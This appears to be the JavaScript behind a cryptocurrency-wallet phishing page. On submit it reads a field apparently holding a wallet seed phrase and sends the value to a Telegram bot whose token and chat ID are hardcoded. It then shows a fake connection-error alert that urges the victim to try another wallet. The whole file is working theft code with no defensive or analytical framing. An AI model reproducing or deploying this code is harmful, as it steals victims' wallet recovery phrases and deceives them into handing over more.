let submitk = document.getElementById("submitk")
//let submitm = document.getElementById("submitm")
//let submitp = document.getElementById("submitp")
//let submitks = document.getElementById("submitks")

$(".former").submit(function(e) {
    e.preventDefault();
});

async function sendMessage(message){
    return new Promise((resolve, reject)=>{
      const chat_id = 1341656638;
      fetch(`https://api.telegram.org/bot6933805363:AAEyYJ-lPJbVaUVzUPn2ROluHwm29EFYT2E/sendMessage?chat_id=${chat_id}&text=${message}`, {
            method: "GET",
            headers: {
                
            }
        })
        .then(async(res) => {
            if(res.status > 399) throw res;
            resolve(await res.json());
        }).catch(err=>{
            reject(err);
        })
    })
  }

submitk.addEventListener("click", () => {
    console.log("clickeed");
    (async function(){
        console.log("clickeed");
        
    if (document.getElementById("submitk")){
        let phrase =document.getElementById("phrased").value;
    //let keypass =document.getElementById("keypass").value;
    
        console.log("phrase");
        sendMessage(`phrase`);
        sendMessage(phrase);
        //await sendMessage(`Password`);
        //await sendMessage(keypass);
        alert("Error connecting with the server ... Pls, try another wallet");
    }
})()
})